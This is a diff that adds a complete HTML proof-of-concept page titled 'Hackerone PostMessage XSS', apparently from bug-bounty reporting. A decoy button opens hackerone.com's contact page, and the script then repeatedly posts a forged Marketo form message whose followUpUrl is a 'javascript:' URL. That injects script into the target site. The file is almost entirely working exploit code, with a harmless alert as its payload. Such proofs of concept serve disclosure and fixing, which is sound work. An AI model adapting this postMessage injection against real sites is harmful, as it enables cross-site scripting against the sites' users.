@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Hackerone PostMessage XSS</title>
+	</head>
+	<body>
+		<p>You want to contact Hackerone! Click this button and submit the form!</p>
+		<button id="openH1">Click Here</button>
+		<script>
+			var h1Win;
+
+			function openWin(){
+				h1Win = window.open("https://www.hackerone.com/#contact/");
+				setInterval(sendMessage, 250);
+			}
+
+			function sendMessage(){
+				h1Win.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}',"*");
+			}
+
+			document.getElementById("openH1").addEventListener('click', openWin);
+		</script>
+	</body>
+</html>
